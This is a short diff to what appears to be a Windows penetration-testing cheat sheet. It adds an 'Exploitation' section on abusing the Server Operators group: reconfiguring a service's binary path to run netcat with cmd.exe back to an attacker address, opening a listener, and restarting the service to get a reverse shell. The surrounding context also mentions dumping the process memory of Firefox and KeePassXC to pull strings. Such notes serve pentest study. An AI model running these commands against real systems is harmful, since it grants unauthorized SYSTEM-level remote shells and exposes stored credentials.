@@ -74,3 +74,19 @@ Dump Process Memory. E.g., Firefox, KeePassXC
 
 Extract Strings from Binary Files
 `strings -el process.dmp`
+
+## Exploitation
+
+Service Binary Path Revshell
+```
+Users who are in the "Server Operators" group can modify, start, and stop system services.
+
+Example of revshell via service binary path (e.g., vss service):
+
+sc.exe config servicename binPath="c:\users\username\nc.exe -e cmd.exe ipaddress port"
+
+nc -lvnp port
+
+sc.exe stop servicename
+sc.exe start servicename
+```
